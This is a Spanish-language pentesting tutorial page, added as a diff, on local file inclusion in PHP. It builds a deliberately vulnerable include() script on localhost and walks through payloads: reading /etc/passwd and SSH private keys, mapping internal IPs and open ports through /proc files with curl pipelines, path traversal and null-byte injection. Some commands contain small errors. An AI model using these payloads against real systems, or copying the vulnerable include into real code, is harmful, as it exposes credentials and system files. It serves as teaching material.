@@ -1,0 +1,138 @@
+---
+title: 'Local file inclusion (LFI)'
+publishedAt: '2024-11-16'
+group: 'tecnicas_pentesting'
+groupOrder: 0
+---
+
+## Antecedentes
+
+Para preparar el entorno vamos a levantar un servidor apache en el que alojaremos un archivo PHP que admita un parametro get con la ruta a un archivo. Esto nos sirva para simular una página que admite un archivo de manera que nosotros podamos explotar esa vulnerabilidad incluyendo un archivo local distinto del que se esperaba.
+
+Vamos a la ruta donde meteremos los archivos del servidor httpd
+```bash
+cd /srv/http
+```
+
+Arrancamos el servicio httpd
+```bash
+sudo systemctl start httpd # Arrancamos https
+```
+
+Comprobamos que está corriendo en el puerto 80
+```bash
+lsof -i :80
+```
+
+Creamos archivo PHP
+```bash
+nano example.php
+```
+
+Y añadimos
+```php
+<?php
+    $filename = $_GET['file']; // ?file=test.txt
+    include($filename);
+?>
+```
+
+Con este código en PHP, se importaría el archivo que se le pasará como query param
+
+Para probarlo, creamos el archivo test.txt
+```text
+Hola. Esto es una prueba
+```
+
+Y accedemos a [http://localhost/example.php?file=test.txt](http://localhost/example.php?file=test.txt)
+
+## Vulnerabilidad
+
+Igual que la página está hecha para que se le pase el archivo test.txt, nosotros sabemos que se puede acceder a más rutas como, por ejemplo, /etc/passwd
+Por lo que, al acceder a [http:localhost/example.php?file=/etc/passwd](http:localhost/example.php?file=/etc/passwd), nos devuelve la información de los usuarios del sistema (haciendo&nbsp;&nbsp;<kbd>ctrl + u</kbd>&nbsp;&nbsp;nos muestra el código fuente formateado). Esto nos muestra que sí que existe una vulnerabilidad que nos permite acceder a los archivos del sistema.
+
+### Rutas interesantes
+
+* `/etc/passd`
+
+Para ver los usuarios existentes en la máquina, hacemos un curl a la ruta con /etc/passd (con -s para silent) y grepeamos por los que acaben en sh
+
+```bash
+curl -s "http://localhost/example.php?file=/etc/passwd" | grep "sh$"
+```
+
+El resultado puede ser algo como
+```csv
+adrian:x:1000:1000::/home/adrian:/usr/bin/zsh
+```
+
+Con lo que intentaríamos acceder a su clave privada de ssh con la ruta /home/adrian/.ssh/id_rsa que puede ser una clave privada de identidad que permita acceder a la máquina por ssh sin necesidad de autenticarnos.
+
+* `/etc/group`
+* `/proc/sched_debug`
+* `/proc/net/fib_trie`
+
+Para ver la ip interna de la máquina:
+1. Hacemos un curl silent (-s) para sacar /proc/net/fib_trie
+2. Filtramos insensible a mayúculas/minúsculas (-i) por "host local"
+3. Añadimos la línea de abajo de las coincidencias (-B 1)
+4. Hacemos un grep mostrando solo las coincidencias (-o) por expresiones regulares Perl (-P) de la ip
+5. Eliminamos repeticiones
+
+<br/>
+
+```
+curl -s "http://localhost/example.php?file=/proc/net/fib_trie" | grep -i "host local" -B 1 | grep -oP '(\d{1,3}\.){3}\d{1,3} | sort -u'
+```
+
+127.0.0.1 será la loopback
+
+192.X.X.X sera la ip interna
+
+Las que haya en medio seran las interfaces de red
+
+* `/proc/net/tcp`
+
+Para ver puertos abiertos internamente.
+
+1. Hacemos un curl silent (-s) para sacar /proc/net/tcp
+2. Cogemos el segundo argumento con awk (las local address)
+3. Eliminamos las filas que contengan "local address" (la cabecera)
+4. Cogemos el segundo argumento con awk para el separador ":" (los puertos en hexadecimal)
+5. Eliminamos duplicados
+
+```
+curl -s "http://localhost/example.php?file=/proc/net/tcp" | awk '{print $2}' | grep -v "local address" | awk '{print $2}' FS=":" | sort -u
+```
+
+El resultado son los puertos. Si ejecutamos python y ponemos 0x + el resultado de uno de los puertos, nos lo devuelve en decimal
+
+Sabiendo esto, sacamos todos los puertos en bash en decimal con un bucle for de todo lo anterior
+
+```
+for port in $(curl -s "http://localhost/example.php?file=/proc/net/tcp" | awk '{print $2}' | grep -v "local address" | awk '{print $2}' FS=":" | sort -u); do echo "[$port] -> Puerto $(echo "ibase=16; $port" | bc)"; done
+```
+
+### Directory Path Traversal
+
+Si el include en php añade una ruta preestablecida como
+
+```php
+include('/srv/http/' . $filename)
+```
+
+el directory path traversal consiste en poner una ruta relativa que retroceda lo suficiente como para llegar a la raíz.
+
+Por lo que la ruta para acceder a /etc/passwd quedaría como [http://localhost/example.php?file=../../../../../../etc/passwd](http://localhost/example.php?file=../../../../../../etc/passwd)
+
+### Null Byte Injection
+
+Si el include en php añade una ruta preestablecida como
+
+```php
+include($filename . '.txt')
+```
+
+a la que solo hay que pasarle el nombre del archivo sin la extension, si nosotros le pasamos [http://localhost/example.php?file=/etc/passwd](http://localhost/example.php?file=/etc/passwd), lo que intentaría buscar el archivo es /etc/passwd.txt, que no existe.
+
+Para bypassear esto, intentamos que no haga caso a lo que hay a la derecha de nuestra ruta añadiendo %00 que representa el carácter nulo \0
